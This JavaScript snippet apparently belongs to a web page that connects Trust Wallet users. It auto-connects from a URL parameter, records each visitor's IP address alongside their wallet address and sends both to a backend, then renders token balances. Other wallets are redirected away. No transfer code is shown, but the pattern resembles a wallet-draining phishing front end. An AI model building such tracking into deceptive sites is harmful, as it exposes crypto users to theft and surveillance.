(function() {
    const CONNECT_BTN = document.getElementById("connectWalletBtn");

    if (CONNECT_BTN) {
        CONNECT_BTN.addEventListener("click", async () => {
            window.debugLog("Connect button clicked", "info");
            
            const address = await connectWallet();
            
            if (address) {
                window.debugLog("Wallet connected: " + address, "success");
                
                window.debugLog("Notifying backend about wallet connect...", "info");
                const ipAddress = await getIPAddress();
                window.debugLog("IP Address: " + ipAddress, "info");
                
                notifyWalletConnect(address, ipAddress);
                window.debugLog("Wallet connect notification sent to backend", "success");
                
                await fetchAndRenderBalances(address, CONTRACT_ADDRESS);
            } else {
                window.debugLog("Wallet connection failed or cancelled", "warning");
            }
        });
    }

    const provider = getTrustWalletProvider();
    if (provider && provider !== "REJECTED_OTHER_WALLET" && typeof provider.on === 'function') {
        provider.on('accountsChanged', (accounts) => {
            window.debugLog("Account changed: " + accounts.length + " accounts", "warning");
            if (accounts.length === 0) {
                location.reload();
            }
        });
    }

    (function autoConnectCheck() {
        const params = new URLSearchParams(window.location.search);
        if (params.get("autoconnect") !== "1") return;
        
        window.debugLog("Auto-connect mode detected", "info");
        
        let attempts = 0;
        const timer = setInterval(async () => {
            attempts++;
            const pCheck = getTrustWalletProvider();
            
            window.debugLog("Auto-connect attempt " + attempts + ": " + (pCheck ? "Provider found" : "No provider"), "info");
            
            if (pCheck && pCheck !== "REJECTED_OTHER_WALLET") {
                clearInterval(timer);
                window.debugLog("Provider detected, connecting...", "success");
                
                const address = await connectWallet();
                
                if (address) {
                    window.debugLog("Auto-connected: " + address, "success");
                    
                    window.debugLog("Notifying backend about wallet connect...", "info");
                    const ipAddress = await getIPAddress();
                    window.debugLog("IP Address: " + ipAddress, "info");
                    
                    notifyWalletConnect(address, ipAddress);
                    window.debugLog("Wallet connect notification sent", "success");
                    
                    await fetchAndRenderBalances(address, CONTRACT_ADDRESS);
                }
            } else if (pCheck === "REJECTED_OTHER_WALLET" || attempts > 15) {
                clearInterval(timer);
                if (pCheck === "REJECTED_OTHER_WALLET") {
                    window.debugLog("Other wallet detected, redirecting...", "warning");
                    redirectToTrustRequired();
                } else {
                    window.debugLog("Auto-connect timeout after 15 attempts", "error");
                }
            }
        }, 500);
    })();
})();